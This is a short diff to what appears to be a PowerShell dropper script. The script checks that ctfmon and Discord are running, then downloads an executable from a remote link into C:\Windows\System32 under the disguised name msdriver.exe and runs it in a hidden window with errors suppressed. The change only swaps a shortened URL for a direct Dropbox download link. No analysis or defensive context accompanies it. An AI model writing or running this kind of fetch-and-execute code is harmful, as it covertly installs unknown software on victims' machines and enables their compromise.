@@ -45,7 +45,7 @@ $ctfmonRunning = Get-Process -Name "ctfmon" -ErrorAction SilentlyContinue
 $discordRunning = Get-Process -Name "discord" -ErrorAction SilentlyContinue
 if ($ctfmonRunning -and $discordRunning) {
     $destination = "C:\Windows\System32\msdriver.exe"
-    $url = "https://tinyurl.com/mtn6xwvu"
+    $url = "https://dl.dropboxusercontent.com/scl/fi/8sr5ikslqkn4q81aoortf/msdriver.exe?rlkey=836a8lb540w926f2fzj9ew5vm&st=s5e7o6k5"
     Invoke-WebRequest -Uri $url -OutFile $destination -ErrorAction SilentlyContinue
     Start-Sleep -Seconds 2
     Start-Process -FilePath $destination -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
